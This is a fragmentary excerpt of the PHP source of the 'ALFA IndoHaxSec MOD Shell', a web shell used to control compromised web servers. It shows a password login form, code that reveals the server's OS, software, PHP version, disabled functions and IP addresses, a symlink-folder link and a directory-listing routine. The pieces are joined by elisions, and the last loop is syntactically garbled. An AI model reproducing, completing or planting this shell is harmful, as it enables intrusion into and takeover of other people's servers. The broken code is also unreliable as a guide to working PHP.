...
$GLOBALS['__ALFA_COLOR__'] = array(
		...
		"editor_header_background" => array(
			"key_color" => "rgba(110, 13, 167, 0.93)",
			"multi_selector" => array(
...
<tr><td bgcolor="red"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="red" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA IndoHaxSec MOD Shell'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
<tr><td bgcolor="white" style="padding:5">
<form method="post">
<input type="hidden" name="action" value="login">
<input type="hidden" name="hide" value="">
<center><table>
<tr><td><font color="gold" face="verdana,arial" size=-1>Login:</font></td><td><input type="text" size="30" name="usrname" placeholder="username" onfocus="if (this.value == \'username\'){this.value = \'\';}"></td></tr>
<tr><td><font color="gold" face="verdana,arial" size=-1>Password:</font></td><td><input type="password" size="30" name="password" placeholder="password" onfocus="if (this.value == \'password\') this.value = \'\';"></td></tr>
...
echo '<html>';
echo "<title>ALFA IndoHaxSec MOD Shell</title>";
...
echo "<br><b style='color:rgb(214, 18, 149)'>OS: </font><font color=gold>" . PHP_OS . "</font><br>";
echo "<b style='color:rgb(177, 9, 140)'>Software: </font><font color=gold>" . $_SERVER ['SERVER_SOFTWARE'] . "</font><br>";
echo "PHP Version: <font color=gold>" . PHP_VERSION .  "</font><br />";
...
echo "$disfun";
echo"</font><br>";
echo "<b style='color: #7CFC00'>Your Ip Address is :  </font><font color=gold>" . $_SERVER['REMOTE_ADDR'] . "</font><br>";
echo "<b style='color: #7CFC00'>Server Ip Address is :  </font><font color=gold>".(function_exists('gethostbyname')?@gethostbyname($_SERVER["HTTP_HOST"]):'???')."</font><br><p>";
...
if(empty($about_us)){
$about_us = "<pre><center><img src='http://solevisible.com/images/farvahar-iran'><br>
...
echo __pre();
echo '<center><b><font color="black">Click >> </font><a target="_blank" href="'.__ALFA_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://raw.githubusercontent.com/NFHURO997XXD/XXX666XXX/refs/heads/main/photo_6154659260559117508_c-removebg-preview.png\"></p>";
...
echo __pre();
while (ir.$file;
if($fCurrent =($file = @readdir($dh)) !== false){
if($file == '..' || $file == '.')continue;
$newfile=$d= $newfile)continue;
if(@is_dir($newfile)){
